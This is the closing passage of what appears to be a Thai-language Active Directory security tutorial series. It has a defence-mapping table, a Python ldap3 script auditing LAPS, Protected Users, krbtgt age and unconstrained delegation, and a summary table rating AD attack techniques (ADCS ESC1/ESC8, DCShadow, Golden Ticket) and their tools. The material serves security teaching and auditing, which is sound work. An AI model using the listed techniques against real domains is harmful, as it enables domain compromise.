| Credentials | Password spray protection | lockout policy | สูง |
| Monitoring | DCSync detection | SIEM, Event 4662 | วิกฤต |
| Monitoring | Golden/Silver Ticket | SIEM, Event 4769 | วิกฤต |
| Tiering | Admin tiering model | GPO, PAW | วิกฤต |
| Privileged | Protected Users group | AD Groups | สูง |
| ADCS | SAN in templates | Certipy | วิกฤต |
| Persistence | AdminSDHolder DACL | PowerView | สูง |
| Password | krbtgt rotation | Script | สูง |

### Defense Script

```python
#!/usr/bin/env python3
"""ad_hardening_checker.py — ตรวจสอบ hardening ของ Active Directory"""

from ldap3 import Server, Connection, ALL

class ADHardeningChecker:
    def __init__(self, domain, dc_ip, username, password):
        self.domain = domain
        self.dc_ip = dc_ip
        self.base_dn = ','.join([f'DC={x}' for x in domain.split('.')])
        server = Server(dc_ip, get_info=ALL)
        self.conn = Connection(
            server,
            user=f'{domain}\\{username}',
            password=password,
            authentication='NTLM',
            auto_bind=True
        )
        self.score = 0
        self.max_score = 0
    
    def check_laps(self):
        """ตรวจสอบว่า LAPS ถูก deploy หรือไม่"""
        self.max_score += 10
        self.conn.search(
            self.base_dn,
            '(objectClass=computer)',
            attributes=['ms-Mcs-AdmPwd', 'sAMAccountName']
        )
        
        with_laps = [e for e in self.conn.entries if e['ms-Mcs-AdmPwd'].value]
        total = len(self.conn.entries)
        
        coverage = len(with_laps) / total * 100 if total > 0 else 0
        
        if coverage >= 90:
            self.score += 10
            status = '✅'
        elif coverage >= 50:
            self.score += 5
            status = '⚠️'
        else:
            status = '❌'
        
        print(f"  {status} LAPS Coverage: {coverage:.0f}% ({len(with_laps)}/{total} computers)")
        return coverage
    
    def check_protected_users(self):
        """ตรวจสอบ Protected Users group membership"""
        self.max_score += 10
        
        # หา DA members
        self.conn.search(self.base_dn, '(sAMAccountName=Domain Admins)', attributes=['member'])
        da_members = set()
        if self.conn.entries:
            da_members = set(str(m).split(',')[0].replace('CN=', '') for m in self.conn.entries[0].member)
        
        # หา Protected Users members
        self.conn.search(self.base_dn, '(sAMAccountName=Protected Users)', attributes=['member'])
        pu_members = set()
        if self.conn.entries:
            pu_members = set(str(m).split(',')[0].replace('CN=', '') for m in self.conn.entries[0].member)
        
        da_not_protected = da_members - pu_members
        
        if not da_not_protected:
            self.score += 10
            print(f"  ✅ All DA members in Protected Users group")
        else:
            print(f"  ❌ DA members NOT in Protected Users: {', '.join(list(da_not_protected)[:5])}")
        
        return da_not_protected
    
    def check_krbtgt_age(self):
        """ตรวจสอบว่า krbtgt password ถูก rotate บ้างไหม"""
        from datetime import datetime
        self.max_score += 10
        
        self.conn.search(
            self.base_dn,
            '(sAMAccountName=krbtgt)',
            attributes=['pwdLastSet']
        )
        
        if self.conn.entries:
            pwd_last_set = self.conn.entries[0].pwdLastSet.value
            if pwd_last_set:
                age = (datetime.utcnow() - pwd_last_set.replace(tzinfo=None)).days
                
                if age <= 90:
                    self.score += 10
                    print(f"  ✅ krbtgt password age: {age} days (< 90 days)")
                elif age <= 180:
                    self.score += 5
                    print(f"  ⚠️ krbtgt password age: {age} days (recommend < 90 days)")
                else:
                    print(f"  ❌ krbtgt password age: {age} days (CRITICAL: rotate immediately!)")
    
    def check_unconstrained_delegation(self):
        """ตรวจสอบ Unconstrained Delegation"""
        self.max_score += 10
        
        self.conn.search(
            self.base_dn,
            '(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(objectClass=organizationalUnit)))',
            attributes=['sAMAccountName', 'objectClass']
        )
        
        non_dc = [e for e in self.conn.entries 
                  if 'DC' not in str(e.sAMAccountName).upper()]
        
        if not non_dc:
            self.score += 10
            print("  ✅ No non-DC objects with Unconstrained Delegation")
        else:
            names = [str(e.sAMAccountName) for e in non_dc]
            print(f"  ❌ Unconstrained Delegation on non-DC: {', '.join(names)}")
        
        return non_dc
    
    def run_all_checks(self):
        """รัน hardening checks ทั้งหมด"""
        print("\n" + "="*60)
        print(f"AD HARDENING REPORT — {self.domain}")
        print("="*60)
        
        print("\n[LAPS]")
        self.check_laps()
        
        print("\n[Protected Users]")
        self.check_protected_users()
        
        print("\n[KRBTGT Age]")
        self.check_krbtgt_age()
        
        print("\n[Unconstrained Delegation]")
        self.check_unconstrained_delegation()
        
        percentage = (self.score / self.max_score * 100) if self.max_score > 0 else 0
        print(f"\n{'='*60}")
        print(f"TOTAL SCORE: {self.score}/{self.max_score} ({percentage:.0f}%)")
        if percentage >= 80:
            print("Overall: GOOD")
        elif percentage >= 60:
            print("Overall: NEEDS IMPROVEMENT")
        else:
            print("Overall: CRITICAL — Immediate Action Required")

if __name__ == "__main__":
    checker = ADHardeningChecker("corp.local", "192.168.1.10", "pentest", "P@ssw0rd!")
    checker.run_all_checks()
```

---

## สรุป

| เทคนิค | ความยาก | ความเสียหาย | เครื่องมือหลัก |
|--------|---------|------------|---------------|
| BloodHound/SharpHound | ต่ำ | ปานกลาง | BloodHound, bloodhound-python |
| ACL Abuse | ปานกลาง | สูง | PowerView, ldap3 |
| Shadow Credentials | สูง | สูง | pywhisker, gettgtpkinit |
| ADCS ESC1 | ต่ำ | วิกฤต | Certipy |
| ADCS ESC8 | ปานกลาง | วิกฤต | Certipy, ntlmrelayx |
| Unconstrained Delegation | ปานกลาง | วิกฤต | Rubeus, PetitPotam |
| Constrained Delegation | ปานกลาง | สูง | impacket getST |
| RBCD | สูง | สูง | impacket rbcd |
| AdminSDHolder | สูง | วิกฤต | PowerView |
| DCShadow | สูงมาก | วิกฤต | mimikatz |
| Cross-Forest | สูงมาก | วิกฤต | mimikatz, ticketer |
| Golden Ticket | สูง | วิกฤต | mimikatz, ticketer |

---

← [Part 93: Advanced Network Attacks](Part-93-Advanced-Network-Attacks.md) | [Part 95: Red Team Operations](Part-95-Red-Team-Operations.md) →
